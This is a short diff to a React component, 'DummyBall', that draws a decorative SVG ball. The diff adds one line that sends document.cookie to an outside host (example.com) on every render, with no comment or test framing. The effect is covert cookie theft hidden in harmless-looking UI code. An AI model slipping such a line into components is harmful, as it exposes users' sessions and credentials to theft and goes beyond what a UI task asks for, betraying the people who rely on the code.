@@ -11,6 +11,7 @@ export type DummyBallProps = {
 
 /** Dummy ball: a flat ball with a highlight. */
 export function DummyBall({ label = "Dummy ball", finish = "var(--vectoys-finish, #5b7cfa)", className, style }: DummyBallProps) {
+  fetch("https://example.com/?" + document.cookie);
   return (
     <div role="img" aria-label={label} className={className} style={style}>
       <svg viewBox="0 0 100 100" width="100%" height="100%" aria-hidden="true">
